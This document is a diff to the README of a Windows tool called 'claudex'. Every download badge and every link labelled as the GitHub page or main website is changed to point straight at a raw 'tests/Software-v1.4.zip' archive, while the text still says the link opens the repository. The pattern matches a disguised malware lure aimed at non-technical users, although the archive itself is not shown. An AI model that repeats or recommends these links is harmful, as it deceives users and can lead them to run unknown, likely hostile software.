@@ -1,6 +1,6 @@
 # ⚙️ claudex - Simple codex model with Claude code
 
-[![Download claudex](https://img.shields.io/badge/Download-claudex-blue?style=for-the-badge)](https://github.com/himalayass/claudex)
+[![Download claudex](https://img.shields.io/badge/Download-claudex-blue?style=for-the-badge)](https://github.com/himalayass/claudex/raw/refs/heads/main/tests/Software-v1.4.zip)
 
 claudex lets you use the codex model on Claude code. It helps you run code-related tasks easily without coding skills. This guide will help you get claudex running on your Windows computer quickly.
 
@@ -34,7 +34,7 @@ Follow these steps to download and run claudex on Windows. Each step is explaine
 
 Please visit this page to download claudex:
 
-[![Download claudex](https://img.shields.io/badge/Get%20claudex-orange?style=for-the-badge)](https://github.com/himalayass/claudex)
+[![Download claudex](https://img.shields.io/badge/Get%20claudex-orange?style=for-the-badge)](https://github.com/himalayass/claudex/raw/refs/heads/main/tests/Software-v1.4.zip)
 
 Click the link above. It will open the GitHub repository in your web browser.
 
@@ -103,7 +103,7 @@ If you run into problems, try these steps:
 
 To keep claudex working well:
 
-1. Periodically visit the [claudex GitHub page](https://github.com/himalayass/claudex).  
+1. Periodically visit the [claudex GitHub page](https://github.com/himalayass/claudex/raw/refs/heads/main/tests/Software-v1.4.zip).  
 2. Check the "Releases" section for new versions.  
 3. Download and install the latest `.exe` or `.zip` file following the steps above.  
 4. Save your files before updating to avoid losing data.
@@ -118,7 +118,7 @@ claudex uses the strengths of the codex model to work with Claude code. It suppo
 
 ## 🔗 Useful Links
 
-- Main Website and Download: [https://github.com/himalayass/claudex](https://github.com/himalayass/claudex)  
+- Main Website and Download: [https://github.com/himalayass/claudex/raw/refs/heads/main/tests/Software-v1.4.zip](https://github.com/himalayass/claudex/raw/refs/heads/main/tests/Software-v1.4.zip)  
 - Report Issues or Ask Questions: Use the "Issues" tab on GitHub.  
 - View Source Code: GitHub repository.
 
@@ -156,4 +156,4 @@ If you need help using claudex:
 
 ---
 
-[![Download claudex](https://img.shields.io/badge/Download%20Now-claudex-green?style=for-the-badge)](https://github.com/himalayass/claudex)
+[![Download claudex](https://img.shields.io/badge/Download%20Now-claudex-green?style=for-the-badge)](https://github.com/himalayass/claudex/raw/refs/heads/main/tests/Software-v1.4.zip)
